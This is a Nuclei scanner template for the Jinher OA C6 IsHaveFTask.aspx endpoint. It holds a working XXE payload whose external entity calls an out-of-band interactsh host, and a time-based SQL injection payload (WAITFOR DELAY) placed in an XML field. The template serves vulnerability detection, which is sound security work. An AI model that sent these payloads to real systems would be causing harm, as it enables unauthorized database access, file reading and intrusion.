id: jinher-oa-c6-IsHaveFTask-xxe-sqli
info:
  name: 金和OA IsHaveFTask.aspx XXE & sqli 漏洞
  author: leadlife
  severity: critical
  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 IsHaveFTask.aspx 接口处存在SQL注入漏洞、XXE漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，还可以通过XXE漏洞读取服务器上敏感文件或探测内网服务信息，甚至在高权限的SQL注入情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483843&idx=1&sn=e27923951874d061abcf9bbeb508066c&chksm=9606e751a1716e47904537dcb858e5c05c4292c9f81c402fdab6e8f650bf2df8261a64ed971b&cur_album_id=4045056277938913283&scene=189#wechat_redirect
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips:
    repair:
    version:
  tags: oob,jinher,oa,c6,sqli

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: 134

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
        %remote;]>
        <root/>
      
        
    matchers:
      - type: word
        name: xxe
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or

  - raw:
      - |
        @timeout: 15s
        POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
        Host: xxxx.com
        Content-Type: application/xml
        Content-Length: 97

        <root>
          <Task>
            <TaskIDList>3);WAITFOR DELAY'0:0:5'-- </TaskIDList>
          </Task>
        </root>
      
    matchers:
      - type: dsl
        name: sqli
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and